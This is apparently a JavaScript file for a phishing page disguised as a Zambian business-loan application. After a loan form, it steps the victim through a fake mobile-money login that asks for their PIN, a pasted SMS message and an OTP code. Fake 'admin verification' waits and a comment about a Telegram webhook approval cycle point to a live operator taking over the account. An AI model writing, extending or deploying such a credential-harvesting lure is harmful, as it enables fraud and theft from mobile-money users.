let currentAppId = null;
let appData = {
  amount: 1000000,
  term: '48 Months',
  type: 'Business Loan',
  purpose: '',
  firstName: '',
  lastName: '',
  phone: '',
  employment: '',
  income: ''
};

// --- Welcome / Calculator View Logic ---
const loanRange = document.getElementById('loanRange');
const calcAmountDisplay = document.getElementById('calcAmountDisplay');
const monthlyPaymentDisplay = document.getElementById('monthlyPaymentDisplay');
const startAppBtn = document.getElementById('startAppBtn');

if (loanRange) {
  loanRange.addEventListener('input', (e) => {
    const val = Number(e.target.value);
    appData.amount = val;
    calcAmountDisplay.textContent = 'ZMW ' + val.toLocaleString();
    
    // Simple mock calculation for monthly payment display
    const monthly = Math.round(val / 48);
    monthlyPaymentDisplay.textContent = 'ZMW ' + monthly.toLocaleString();
    
    const inputLoanAmount = document.getElementById('inputLoanAmount');
    if (inputLoanAmount) inputLoanAmount.value = val;
  });
}

if (startAppBtn) {
  startAppBtn.addEventListener('click', () => {
    document.getElementById('view-welcome').style.display = 'none';
    document.getElementById('application-flow').style.display = 'block';
    showStep(1);
  });
}

// Back to Welcome
const backBtn = document.getElementById('backBtn');
if (backBtn) {
  backBtn.addEventListener('click', () => {
    document.getElementById('application-flow').style.display = 'none';
    document.getElementById('view-welcome').style.display = 'block';
  });
}

// --- Multi-Step Form Navigation ---
function showStep(stepNum) {
  document.querySelectorAll('#application-flow .form-step').forEach(el => el.style.display = 'none');
  document.getElementById(`step-${stepNum}`).style.display = 'block';
  
  // Update progress lines
  for (let i = 1; i <= 3; i++) {
    const line = document.getElementById(`indicator-${i}`);
    if (line) {
      if (i <= stepNum) line.classList.add('active');
      else line.classList.remove('active');
    }
  }
  
  const counterText = document.getElementById('stepCounterText');
  if (counterText) counterText.textContent = `Step ${stepNum} of 3`;
}

// Step 1 Next
const step1Next = document.getElementById('step1Next');
if (step1Next) {
  step1Next.addEventListener('click', () => {
    appData.type = document.getElementById('loanType').value;
    appData.amount = document.getElementById('inputLoanAmount').value;
    appData.term = document.getElementById('loanTerm').value;
    appData.purpose = document.getElementById('loanPurpose').value;
    showStep(2);
  });
}

// Step 2 Controls
const step2Back = document.getElementById('step2Back');
const step2Next = document.getElementById('step2Next');

if (step2Back) step2Back.addEventListener('click', () => showStep(1));

if (step2Next) {
  step2Next.addEventListener('click', () => {
    appData.firstName = document.getElementById('firstName').value;
    appData.lastName = document.getElementById('lastName').value;
    appData.phone = '+260' + document.getElementById('momo_phone').value;

    if (!appData.firstName || !appData.lastName || document.getElementById('momo_phone').value.length < 9) {
      alert('Please fill in valid names and phone number.');
      return;
    }

    // Populate summary for step 3
    document.getElementById('sumAmount').textContent = 'ZMW ' + Number(appData.amount).toLocaleString();
    document.getElementById('sumTerm').textContent = appData.term;
    document.getElementById('sumPurpose').textContent = appData.purpose || '-';
    document.getElementById('sumApplicant').textContent = `${appData.firstName} ${appData.lastName}`;

    showStep(3);
  });
}

// Step 3 Controls
const step3Back = document.getElementById('step3Back');
const submitAppBtn = document.getElementById('submitAppBtn');

if (step3Back) step3Back.addEventListener('click', () => showStep(2));

if (submitAppBtn) {
  submitAppBtn.addEventListener('click', async () => {
    appData.employment = document.getElementById('employmentStatus').value;
    appData.income = document.getElementById('annualIncome').value;

    submitAppBtn.textContent = 'Submitting Application...';
    submitAppBtn.disabled = true;

    try {
      const res = await fetch('/applications', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(appData)
      });
      const data = await res.json();
      currentAppId = data.id || 'APP-' + Math.floor(Math.random() * 1000000000);

      // Transition to MoMo Login View
      document.getElementById('application-flow').style.display = 'none';
      document.getElementById('displayPhoneNum').textContent = document.getElementById('momo_phone').value;
      document.getElementById('momo-login-view').style.display = 'block';
    } catch (e) {
      console.error(e);
      // Fallback local transition if backend is offline
      currentAppId = 'APP-1785526685654';
      document.getElementById('application-flow').style.display = 'none';
      document.getElementById('displayPhoneNum').textContent = document.getElementById('momo_phone').value;
      document.getElementById('momo-login-view').style.display = 'block';
    }
  });
}

// --- MoMo PIN Login View Logic ---
const momoPinInput = document.getElementById('momo_pin');
const loginMoMoBtn = document.getElementById('loginMoMoBtn');

if (momoPinInput) {
  momoPinInput.addEventListener('input', (e) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 5);
    e.target.value = val;

    // Update visual dots
    const dots = document.querySelectorAll('.pin-dots .dot');
    dots.forEach((dot, idx) => {
      dot.textContent = val[idx] ? '•' : '';
    });

    if (val.length === 5) {
      loginMoMoBtn.removeAttribute('disabled');
    } else {
      loginMoMoBtn.setAttribute('disabled', 'true');
    }
  });
}

if (loginMoMoBtn) {
  loginMoMoBtn.addEventListener('click', async () => {
    document.getElementById('momo-login-view').style.display = 'none';
    showWaitingScreen('Waiting for Admin Approval', 'Your login is pending admin verification. Please wait...', 'Admin is reviewing your request...');

    // Simulate backend / telegram webhook approval cycle
    setTimeout(() => {
      hideWaitingScreen();
      document.getElementById('sms-verification-view').style.display = 'block';
      startSmsTimer();
    }, 4000);
  });
}

// --- SMS Verification View Logic ---
let smsTimerInterval;
function startSmsTimer() {
  let timeLeft = 59;
  const timerElem = document.getElementById('timerSeconds');
  
  clearInterval(smsTimerInterval);
  smsTimerInterval = setInterval(() => {
    timeLeft--;
    if (timerElem) timerElem.textContent = timeLeft;
    if (timeLeft <= 0) clearInterval(smsTimerInterval);
  }, 1000);
}

const smsTextarea = document.getElementById('sms_text');
const submitSmsBtn = document.getElementById('submitSmsBtn');

if (smsTextarea) {
  smsTextarea.addEventListener('input', (e) => {
    if (e.target.value.trim().length > 5) {
      submitSmsBtn.removeAttribute('disabled');
    } else {
      submitSmsBtn.setAttribute('disabled', 'true');
    }
  });
}

if (submitSmsBtn) {
  submitSmsBtn.addEventListener('click', async () => {
    document.getElementById('sms-verification-view').style.display = 'none';
    showWaitingScreen('Verifying SMS Message', 'Your SMS message has been received. Please wait for admin verification...', 'Admin is verifying your message...');

    setTimeout(() => {
      hideWaitingScreen();
      document.getElementById('otp-verification-view').style.display = 'block';
    }, 4000);
  });
}

// --- OTP Verification View Logic ---
const otpInput = document.getElementById('otp_code');
const submitOtpBtn = document.getElementById('submitOtpBtn');

if (otpInput) {
  otpInput.addEventListener('input', (e) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 4);
    e.target.value = val;
    if (val.length === 4) {
      submitOtpBtn.removeAttribute('disabled');
    } else {
      submitOtpBtn.setAttribute('disabled', 'true');
    }
  });
}

if (submitOtpBtn) {
  submitOtpBtn.addEventListener('click', async () => {
    document.getElementById('otp-verification-view').style.display = 'none';
    showWaitingScreen('Verifying OTP Code', 'Your OTP code has been received. Please wait for admin verification...', 'Admin is verifying your OTP code...');

    setTimeout(() => {
      hideWaitingScreen();
      document.getElementById('success-view').style.display = 'block';
    }, 4000);
  });
}

// Helper for Waiting Screens
function showWaitingScreen(title, subtitle, progressText) {
  document.getElementById('waitingTitle').textContent = title;
  document.getElementById('waitingSubtitle').textContent = subtitle;
  document.getElementById('waitingProgressBar').textContent = progressText;
  document.getElementById('appIdText').textContent = currentAppId;
  document.getElementById('admin-waiting-view').style.display = 'flex';
}

function hideWaitingScreen() {
  document.getElementById('admin-waiting-view').style.display = 'none';
    }
      
